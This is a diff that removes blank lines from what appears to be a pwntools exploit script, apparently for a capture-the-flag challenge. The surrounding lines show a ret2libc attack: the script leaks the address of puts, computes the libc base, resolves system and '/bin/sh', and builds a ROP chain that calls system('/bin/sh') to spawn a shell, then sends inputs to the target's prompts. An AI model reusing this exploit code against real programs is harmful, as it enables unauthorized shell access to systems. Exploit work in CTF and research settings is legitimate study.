@@ -146,8 +146,6 @@ p.recvuntil("Bye!\n")
 leaked_puts = p.recv(4)
 
 print("leaked_puts :: " + hex(u32(leaked_puts)))
-
-
 base = u32(leaked_puts) - libc.symbols['puts']
 print("base :: " + hex(base))
 libc.address = base
@@ -156,7 +154,6 @@ system = libc.symbols['system']
 print("shell :: " + hex(bin_shell))
 rop_system = ROP(elf)
 rop_system.call(system, [bin_shell])
-
 
 p.recvuntil("name:")
 p.sendline("HERE_NAME")
@@ -168,7 +165,6 @@ p.recvuntil("comment:")
 p.send("HERE_COMMENT")
 p.recvuntil("<y/n>:")
 p.sendline("y")
-
 
 p.recvuntil("name:")
 p.sendline("AAAA")
@@ -194,7 +190,6 @@ p.recvuntil("comment:")
 p.sendline("BBBB")
 p.recvuntil("<y/n>:")
 p.sendline("n")
-
 
 #p.recvuntil("name:")
 #p.sendline("B"*110)
